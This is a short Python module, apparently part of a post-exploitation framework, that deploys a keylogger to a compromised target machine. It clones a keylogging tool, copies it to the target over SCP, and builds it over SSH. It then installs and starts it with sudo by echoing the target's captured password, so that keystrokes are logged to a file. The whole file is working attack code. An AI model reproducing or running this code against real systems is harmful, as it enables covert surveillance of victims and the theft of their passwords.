from module import *
import os
import time

class Keylogger(Module):

    def __init__(self, target, command, core):
        self.core = core
        self.target = target
        self.name = "Keylogger"
        self.command = command
        self.options = {
                "frequency": Option("frequency", "* * * * *", "how often to run command", False),
                }

    def exploit(self, command):
        os.system('git clone https://github.com/kernc/logkeys')
	self.target.scpFiles(self, 'logkeys', True)
	self.target.ssh.exec_command("./logkeys/configure")
	time.sleep(10)
	print("Configuring...")
	self.target.ssh.exec_command("make logkeys")
	time.sleep(10)
	print("Making...")
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S make install logkeys")
	print("Installing...")
	time.sleep(10)
	self.target.ssh.exec_command("touch log.log")
	time.sleep(1)
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output log.log")
	print("Starting...")

	print(GOOD + self.name + " module success")
